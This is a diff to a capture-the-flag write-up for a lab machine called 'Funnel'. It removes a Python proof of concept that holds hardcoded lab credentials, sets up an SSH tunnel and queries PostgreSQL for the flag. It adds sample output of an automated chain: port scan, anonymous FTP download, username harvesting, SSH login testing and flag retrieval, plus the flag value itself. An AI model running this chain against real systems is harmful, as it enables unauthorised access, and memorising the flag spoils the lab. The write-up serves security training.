@@ -40,29 +40,42 @@ python3 funnel_exploit.py
 
 ---
 
-## **PoC Code Snippet**
+## **Sample Output**
 
-```python
-import paramiko
-import psycopg2
-import ftplib
-import subprocess
+```bash
+$ python3 funnel_exploit.py
 
-TARGET_IP = "10.129.228.195"
-USERNAME = "christine"
-PASSWORD = "funnel123#!#"
-LOCAL_PORT = 1234
-REMOTE_PORT = 5432
+▗▄▄▖                ▝▜  ▗▄▄                                                                                                                                                                                                                                                                       
+▐   ▗ ▗ ▗▗▖ ▗▗▖  ▄▖  ▐  ▐ ▝▌▖  ▖▗▗▖                                                                                                                                                                                                                                                               
+▐▄▄▖▐ ▐ ▐▘▐ ▐▘▐ ▐▘▐  ▐  ▐▄▟▘▚▗▗▘▐▘▐                                                                                                                                                                                                                                                               
+▐   ▐ ▐ ▐ ▐ ▐ ▐ ▐▀▀  ▐  ▐   ▐▟▟ ▐ ▐                                                                                                                                                                                                                                                               
+▐   ▝▄▜ ▐ ▐ ▐ ▐ ▝▙▞  ▝▄ ▐    ▌▌ ▐ ▐                                                                                                                                                                                                                                                               
+                                     
 
-def ssh_tunnel():
-    subprocess.Popen(f"ssh -L {LOCAL_PORT}:localhost:{REMOTE_PORT} {USERNAME}@{TARGET_IP}", shell=True)
+[+] Running Nmap Scan...
+[+] Open Ports: [21, 22]
 
-def fetch_flag():
-    conn = psycopg2.connect(dbname="secrets", user=USERNAME, password=PASSWORD, host="127.0.0.1", port=LOCAL_PORT)
-    cur = conn.cursor()
-    cur.execute("SELECT * FROM flag;")
-    print("[FLAG]:", cur.fetchone()[0])
-    conn.close()
+[+] Checking FTP anonymous access...
+[+] Downloading welcome_28112022
+[+] Downloading password_policy.pdf
+[+] FTP files retrieved.
+
+[+] Extracting usernames...
+[+] Users found: ['christine', 'albert', 'maria']
+
+[+] Testing SSH logins...
+[+] SSH login successful for christine.
+
+[+] Establishing SSH connection...
+[+] SSH Connected.
+
+[+] Setting SSH Tunnel...
+[+] SSH Tunnel established.
+
+[+] Querying PostgreSQL...
+📌 [FLAG] cf277664b1771217d7006acdea006db1
+
+[+] Cleanup complete.
 ```
 
 ---
